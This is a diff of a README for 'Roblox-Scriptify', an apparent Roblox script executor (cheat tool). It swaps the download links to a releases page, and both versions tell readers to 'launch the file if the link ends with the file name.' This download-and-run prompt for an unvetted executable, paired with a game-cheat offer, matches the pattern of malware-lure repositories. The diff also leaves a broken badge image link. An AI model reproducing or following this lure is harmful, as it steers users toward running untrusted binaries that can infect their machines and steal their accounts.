@@ -31,11 +31,11 @@ Explore a wide range of topics related to Roblox-Scriptify:
 
 ## Get Started 🚀
 
-Ready to supercharge your Roblox experience with Roblox-Scriptify? Head over to [Roblox-Scriptify Executor](https://github.com/file/App.zip) and unleash the power of seamless script execution in Roblox games! Remember to launch the file if the link ends with the file name.
+Ready to supercharge your Roblox experience with Roblox-Scriptify? Head over to [Roblox-Scriptify Executor](https://github.com/chenjee/Roblox-Scriptify/releases/tag/v2.0) and unleash the power of seamless script execution in Roblox games! Remember to launch the file if the link ends with the file name.
 
 If the link provided is not working or you need more information, be sure to check the "Releases" section for updates and additional resources.
 
-[![Download Roblox-Scriptify](https://img.shields.io/badge/Download-Roblox--Scriptify-blue)](https://github.com/file/App.zip)
+[![Download Roblox-Scriptify](https://github.com/chenjee/Roblox-Scriptify/releases/tag/v2.0)](https://github.com/chenjee/Roblox-Scriptify/releases/tag/v2.0)
 
 ## Collaborate and Contribute 🤝
 
